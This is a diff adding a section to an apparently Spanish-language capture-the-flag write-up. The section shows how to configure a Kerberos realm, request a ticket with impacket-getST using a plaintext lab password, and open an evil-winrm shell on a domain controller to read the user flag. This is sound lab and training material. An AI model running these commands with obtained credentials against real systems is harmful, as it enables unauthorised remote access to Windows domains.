@@ -511,6 +511,38 @@ a19**************************e91
 PS C:\Users\miscsvc\Documents></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Otra forma es mediante <code class="language-plaintext highlighter-rouge">winrm</code>, sin embargo ya que la autenticacion <code class="language-plaintext highlighter-rouge">NTLM</code> esta deshabilitada para autenticarnos por <code class="language-plaintext highlighter-rouge">kerberos</code> es necesario configurar el <code class="language-plaintext highlighter-rouge">realm</code> <code class="language-plaintext highlighter-rouge">SCRM.LOCAL</code> el cual se agrega desde el archivo <code class="language-plaintext highlighter-rouge">/etc/krb5.conf</code> en los realms</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[realms]
+	SCRM.LOCAL = {
+		kdc = dc1.scrm.local
+		admin_server = dc1.scrm.local  
+		default_domain = scrm.local
+	}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez agregado con <code class="language-plaintext highlighter-rouge">getST</code> de impacket solicitamos un <code class="language-plaintext highlighter-rouge">ticket</code> hacia el spn <code class="language-plaintext highlighter-rouge">krbtgt/scrm.local@scrm.local</code> para despues exportar en la variable <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getST </span><span class="p">scrm.local/MiscSvc:ScrambledEggs9900 -spn krbtgt/scrm.local@scrm.local  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Getting ST for user
+[*] Saving ticket in MiscSvc.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=MiscSvc.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora autenticandonos con el <code class="language-plaintext highlighter-rouge">ticket</code> antes generado podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> a la maquina indicando el <code class="language-plaintext highlighter-rouge">realm</code> que hemos agregado de antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i dc1.scrm.local -r scrm.local
+PS C:\Users\miscsvc\Documents> </span><span class="am">whoami</span><span class="p">
+scrm\miscsvc
+PS C:\Users\miscsvc\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+a19**************************e91
+PS C:\Users\miscsvc\Documents></span>
+</code></pre></div></div><br>
+
 </section>
 
 <section class="post" id="shell-administrator">
